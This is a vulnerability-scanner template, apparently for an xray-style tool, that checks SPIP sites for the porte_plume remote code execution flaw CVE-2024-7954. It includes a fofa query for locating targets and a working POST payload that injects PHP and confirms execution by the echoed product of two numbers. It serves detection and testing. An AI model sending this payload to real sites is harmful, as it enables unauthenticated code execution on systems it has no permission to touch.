id: CVE-2024-7954
info:
  name: SPIP Porte Plume Plugin rce
  author: laohuan12138
  severity: critical
  verified: true
  description: |-
    在4.30-alpha2、4.2.13和4.1.16之前的SPIP中使用的porte_plume插件存在任意代码执行漏洞。远程且未经认证的攻击者可以通过发送特制的HTTP请求，以SPIP用户的身份执行任意PHP代码。
    fofa: app="SPIP"
  references:
    - https://mp.weixin.qq.com/s/VIMi4PY5GEtdKOBk3CIZlQ
    - https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-7954
  tags: rce,cve,cve2024
  created: 2024/09/02

set:
  num1: randomInt(1000,9999)
  num2: randomInt(1000,9999)

rules:
  r0:
    request:
      method: POST
      path: /index.php?action=porte_plume_previsu
      header:
        Content-Type: application/x-www-form-urlencoded
      body: data=AA_[<img111111>->URL`<?php echo {{num1}}*{{num2}};?>`]_BB
    expression: response.status == 200 && response.body.bcontains(bytes(string(num1 * num2)))

expression: r0()
